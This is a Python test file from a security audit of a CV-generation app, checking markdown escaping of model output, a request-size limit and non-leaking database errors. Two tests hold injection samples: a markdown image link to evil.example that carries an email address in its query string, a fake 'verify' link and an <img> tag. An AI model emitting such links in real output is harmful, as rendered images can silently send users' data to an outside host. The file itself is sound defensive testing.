"""Захисти з аудиту безпеки: екранування тексту моделі, ліміт запиту, загальні помилки бази."""

import pytest

from cvmax.cv_render import render_markdown
from cvmax.db import DBError, SupabaseDB
from cvmax.demo import FakeClient, demo_built_cv
from cvmax.llm import MAX_REQUEST_CHARS, LLMError, ask_structured
from cvmax.safe_text import md_escape
from cvmax.schemas import BuiltCV
from tests.test_db_builder import FakeHTTP


def test_md_escape_neutralises_links_images_and_html():
    evil = "See ![x](https://evil.example/p?d=a@b.c) and [verify](https://evil.example) <img src=x>"
    out = md_escape(evil)
    assert "](" not in out and "![" not in out and "\\<img" in out
    assert "`https://evil.example/p?d=a@b.c)`" in out  # адреса видна, але як код, не посилання
    assert md_escape("Grew sales 20% - see www.site.com") == "Grew sales 20% \\- see `www.site.com`"


def test_render_markdown_escapes_model_fields():
    cv = demo_built_cv().model_copy(update={"summary": "[click](https://evil.example)"})
    assert "[click](" not in render_markdown(cv)


def test_huge_request_rejected_before_calling_model():
    client = FakeClient()
    with pytest.raises(LLMError):
        ask_structured(client, system="x", content=[{"type": "text", "text": "a" * (MAX_REQUEST_CHARS + 1)}],
                       output_model=BuiltCV, effort="low")
    assert client.calls == []


def test_db_error_does_not_leak_response_body():
    http = FakeHTTP(status=500, body={"message": "relation cvmax_private.app_config secret detail"})
    db = SupabaseDB("https://p.supabase.co", "k", "t", session=http)
    with pytest.raises(DBError) as e:
        db.consume("a@b.c", "analysis", 5, 60)
    assert "app_config" not in str(e.value) and "err" not in str(e.value)
